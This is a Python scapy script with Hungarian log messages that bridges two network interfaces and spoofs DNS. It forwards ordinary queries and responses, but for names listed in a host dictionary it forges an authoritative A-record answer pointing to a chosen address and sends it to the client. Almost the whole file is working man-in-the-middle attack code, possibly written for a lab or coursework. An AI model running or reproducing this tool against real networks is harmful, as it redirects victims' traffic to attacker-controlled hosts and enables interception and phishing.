import threading
from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSRR, NTP, sendpfast, conf


def dns_resp(iface1, iface2, hostDict, stop_event):
	print(f'kartya 1 mukszik on {iface1}, sending to {iface2}')
	socket2 = conf.L2socket(iface=iface2)
	while not stop_event.is_set():
		pkt = sniff(iface=iface1, filter="udp and src port 53", store=1, count=1, stop_filter=lambda x: stop_event.is_set())
		if pkt:
			packet = pkt[0]
			if packet.haslayer(DNS):               
				try:
					#sendpfast(packet, mbps=1000, iface=iface2, count=1)  # Send to iface2
					#sendp(packet, verbose=0, iface=iface2, count=1)
					socket2.send(packet)
					print("elkuldve eredeti valasz")
				except Exception as e:
					print(f"Nem tudta elkuldeni a valaszt: {e}")
					packet.show()
			packet_info = packet.summary()
			from ui import packet_queue
			packet_queue.put((packet_info, False, True))
			del packet

def dns_query(iface1, iface2, hostDict, stop_event):
	print(f'kartya 2 mukszik on {iface2}, sending to {iface1}')
	print("")
	socket1 = conf.L2socket(iface=iface1)
	
	while not stop_event.is_set():
		pkt = sniff(iface=iface2, filter="udp and dst port 53", store=1, count=1, stop_filter=lambda x: stop_event.is_set())
		if pkt:
			packet = pkt[0]
			packet_info = packet.summary()
			from ui import packet_queue
			packet_queue.put((packet_info, False, packet[DNS].qr == 1))
	
			if packet.haslayer(DNS):
				queryName = packet[DNS].qd.qname
				if queryName in hostDict:
					eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
					ip = IP(src=packet[IP].dst, dst=packet[IP].src)
					udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
					dns = DNS(
						id=packet[DNS].id,
						qd=packet[DNS].qd,
						aa=1,
						rd=0,
						qr=1,
						qdcount=1,
						ancount=1,
						nscount=0,
						arcount=0,
						an=DNSRR(
							rrname=packet[DNS].qd.qname,
							type='A',
							ttl=600,
							rdata=hostDict[queryName])
						)
					response_packet = eth / ip / udp / dns
	
					modified_info = response_packet.summary()
					packet_queue.put((modified_info, True, True))
	
					print("eredeti keres")
					packet.show()
					print("hamisitott valasz")
					response_packet.show()
					#sendpfast(response_packet, mbps=1000, iface=iface1)
					#sendp(response_packet, verbose=0, iface=iface1, count=1)
					socket1.send(response_packet)
					continue

			try:
				#sendpfast(pkt, mbps=1000, iface=iface1, count=1)  # Send to iface1
				#sendp(pkt, verbose=0, iface=iface1, count=1)  # Send to iface1
				socket1.send(packet)
				print("elkuldve eredti keres")
			except Exception as e:
				print(f"Nem tudta elkuldeni a kerest: {e}")
				packet.show()
			del pkt

